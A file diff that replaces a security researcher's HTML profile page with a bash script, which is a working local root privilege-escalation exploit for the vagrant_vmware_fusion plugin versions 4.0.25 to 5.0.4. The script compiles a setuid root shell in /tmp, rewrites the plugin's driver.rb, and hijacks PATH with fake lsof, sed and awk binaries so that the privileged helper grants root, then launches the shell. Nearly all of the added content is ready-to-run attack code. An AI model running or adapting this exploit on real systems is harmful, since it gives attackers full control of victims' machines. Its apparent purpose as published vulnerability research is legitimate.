@@ -1,53 +1,87 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html>
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
-        <link rel="stylesheet" type="text/css" href="/css/style.css" />
-        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-        <script src='https://www.google.com/recaptcha/api.js'></script>
-        <script src="/js/site.js"></script>
-        <title>Mark Wadham</title>
-    </head>
-    <body>
-        <div id="menu">
-                        <h3>Mark Wadham</h3>
-            <ul>
-                <li><a href="/index.html">profile</a></li>
-                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
-                <li><a href="/cves.html">CVEs</a></li>
-                <li><a href="/jsdemos.html">js demos</a></li>
-                <li><a href="/contact.html">contact</a></li>
-                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
-                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
-                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
-                <li class="red space small"></li>
-            </ul>
+#!/bin/bash
+echo
+echo "################################################################"
+echo "# vagrant_vmware_fusion plugin 4.0.25-5.0.4 local root privesc #"
+echo "# by m4rkw - https://m4.rkw.io/blog.html                       #"
+echo "################################################################"
+echo
 
-        </div>
-        <div id="content">
-            <div id="main-content">
-                            <h1>Profile</h1>
+cleanup() {
+  rm -rf ~/.vagrant_vmware_fusion_504_exp
+  mv -f ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb
+}
 
-            <p>I am fluent in several programming languages and currently work as a Big Data
-            engineer.</p>
+gem_version="2.4.2"
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d '-' -f4 |tail -n1`
 
-            <p>In my spare time I do a bit of security research and have found vulnerabilities in
-            several popular Mac applications. I enjoy working with software vendors to help make
-            the mac software ecosystem more secure.</p>
+cat > /tmp/vvp_504.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","rm -f /tmp/vvp_504; /bin/bash",NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_504 /tmp/vvp_504.c
+rm -f /tmp/vvp_504.c
 
-            <p>Check out my blog here: <a href="/blog.html">https://m4.rkw.io/blog.html</a></p>
+cd
+mkdir .vagrant_vmware_fusion_504_exp
+cd .vagrant_vmware_fusion_504_exp
 
-            </div>
-        </div>
-				<script>
-						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+if [ ! -e ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+  mv ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig
+fi
 
-						ga('create', 'UA-91604161-1', 'auto');
-						ga('send', 'pageview');
-				</script>
-    </body>
-</html>
+cat > ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb <<EOF
+system("/Users/#{ENV["USER"]}/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status")
+exit 0
+EOF
+
+success=0
+
+export PATH=.:$PATH
+
+function attempt()
+{
+  cat > /tmp/vvp_504.c <<EOF
+#include <unistd.h>
+#include <stdlib.h>
+int main(int ac, char *av[])
+{
+  if (geteuid() == 0) {
+    setuid(0);
+    setgid(0);
+    system("chown root:wheel /tmp/vvp_504");
+    system("chmod 4755 /tmp/vvp_504");
+  }
+  execv("/usr/bin/$1",av);
+  return 0;
+}
+EOF
+  gcc -o $1 /tmp/vvp_504.c
+  rm -f /tmp/vvp_504.c
+
+  `ruby ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb 2>/dev/null`
+
+  r=`ls -la /tmp/vvp_504 |grep '\-rws' |grep root`
+
+  if [ "$r" != "" ] ; then
+    cleanup
+    cd
+    /tmp/vvp_504
+    exit 0
+  else
+    rm -f $1
+  fi
+}
+
+attempt "lsof"
+attempt "sed"
+attempt "awk"
+
+cleanup
+
+echo "not vulnerable"
